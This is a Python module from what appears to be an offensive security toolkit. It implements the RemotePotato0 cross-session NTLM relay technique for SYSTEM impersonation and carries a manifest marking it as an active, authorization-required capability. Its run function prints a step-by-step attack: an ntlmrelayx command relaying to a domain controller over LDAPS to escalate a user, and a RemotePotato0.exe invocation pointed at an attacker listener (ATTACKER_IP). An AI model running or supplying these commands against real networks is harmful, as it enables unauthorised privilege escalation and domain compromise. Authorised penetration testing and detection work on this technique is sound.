"""RemotePotato0  -  cross-session NTLM relay → SYSTEM impersonation."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.coercion.remotepotato.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_relay", "privilege_escalation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1557.001"],
}


def run(args: Any) -> int:
    target = getattr(args, "target", None)
    listener = getattr(args, "listener", None)

    print("[*] RemotePotato0: cross-session NTLM relay")
    print("[*] Requires: low-priv session + privileged user session on same host")

    print("\n[*] Attack steps:")
    print("  1. Start socat/ntlmrelayx on attacker: ntlmrelayx.py -t ldaps://DC -smb2support --escalate-user <user>")
    print("  2. On target: RemotePotato0.exe -m 0 -r {} -x {} -p 9998 -s 1".format(
        listener or "ATTACKER_IP", listener or "ATTACKER_IP"))
    print("  3. Privileged user's NTLM hash is relayed to DC for escalation")

    return 0
